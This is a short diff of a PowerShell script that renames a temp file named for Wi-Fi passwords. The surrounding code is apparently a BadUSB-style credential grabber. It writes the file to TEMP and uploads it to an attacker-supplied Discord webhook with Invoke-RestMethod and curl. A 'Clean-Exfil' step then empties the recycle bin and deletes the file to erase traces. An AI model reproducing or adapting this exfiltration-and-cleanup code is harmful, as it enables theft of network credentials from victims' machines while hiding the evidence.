@@ -3,7 +3,7 @@
 $wifiProfiles = "Привет, $env:username"
 
 
-$wifiProfiles > $env:TEMP/--wifi-passsss.txt
+$wifiProfiles > $env:TEMP/--wifi-pass.txt
 
 ############################################################################################################################################################
 
@@ -30,7 +30,7 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--wifi-passsss.txt"}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--wifi-pass.txt"}
 
  
 
@@ -57,4 +57,4 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
 
 
-RI $env:TEMP/--wifi-passsss.txt
+RI $env:TEMP/--wifi-pass.txt
